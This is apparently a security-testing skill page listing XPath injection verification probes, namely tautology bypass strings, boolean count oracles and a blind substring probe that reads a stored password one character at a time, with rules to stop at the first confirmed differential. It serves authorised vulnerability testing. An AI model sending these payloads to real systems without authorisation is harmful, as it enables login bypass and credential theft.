# Diagnostic Verification Probes and Code Patterns

> Sub-skill: [`ldap-and-xpath-injection-xpath`](SKILL.md) | Family: **Web and Application**

Non-destructive verification probes owned by `ldap-and-xpath-injection-xpath`. Record a benign baseline first; every class below is chosen so the response differs only when the weakness is present.

## Verification Classes

### Tautology selection probe

**Expected differential:** closing the literal with a true predicate selects more nodes or bypasses the check, while the literal control selects exactly one node

```text
name=' or '1'='1
name=' or '1'='2
name=realuser (literal control)
```

### Boolean structure oracle

**Expected differential:** a true count predicate matches the baseline node-set while a false one empties it

```text
q=' and count(/*)=1 and '1'='1
q=' and count(/*)=999 and '1'='1
```

### Blind substring extraction oracle

**Expected differential:** a response that differs when the first node character equals a reveals it without echoing the value

```text
p=' or substring((//user[1]/password),1,1)='a
p=' or substring((//user[1]/password),1,1)='9
```

## Usage Rules

- Send one probe class at a time and keep the benign control request identical in every other respect.
- Stop at the first differential that proves the invariant is missing; do not escalate within the same request.
- Every confirmed class maps to the structural remediation in [`SKILL.md`](SKILL.md).
